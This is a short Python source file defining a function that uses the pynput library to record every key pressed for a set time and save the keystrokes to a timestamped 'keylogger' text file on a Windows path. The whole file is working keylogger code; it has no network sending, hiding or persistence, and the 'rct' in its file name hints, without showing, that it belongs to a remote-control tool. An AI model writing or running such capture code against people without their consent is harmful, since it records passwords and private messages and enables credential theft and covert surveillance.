from pynput import keyboard
import threading
from datetime import datetime

def key_logger(stime : int,path : str):
    log = []
    namefile = path + "\\keylogger_rct__"+datetime.now().strftime("%Y%m%d_%H%M%S")+".txt"
    def stop():
        listener.stop()
    def on_press(key):
        nonlocal log
        log.append(str(key))
    with keyboard.Listener(on_press=on_press) as listener:
        timer = threading.Timer(stime,stop)
        timer.start()
        listener.join()
    with open(namefile, "a", encoding="utf-8") as log_file:
        log_file.write(" ".join(log) + "\n")
        
    return namefile
        
    
        


